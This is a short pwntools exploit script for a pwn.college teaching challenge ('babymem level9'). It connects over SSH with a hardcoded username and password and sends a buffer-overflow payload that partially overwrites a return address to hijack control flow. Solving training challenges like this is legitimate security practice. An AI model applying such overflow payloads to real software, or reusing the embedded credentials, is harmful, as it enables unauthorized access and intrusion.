from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../csec")

context.log_level = 'debug'
p = s.process("./babymem_level9_teaching1")
# p = process('./babymem_level9_teaching1')

p.sendlineafter(b'Payload size: ',b'74')
pay = b'A'*40+p8(8*9-1)
# pay = pay.ljust(0x78,b'B')
# pay += p16(0x45E0)
# pause()
p.sendafter(b'input buffer.\n',pay)
p.sendafter(b'input buffer.\n',p16(0x667A))
# p.send(p16(0x767A))
p.interactive()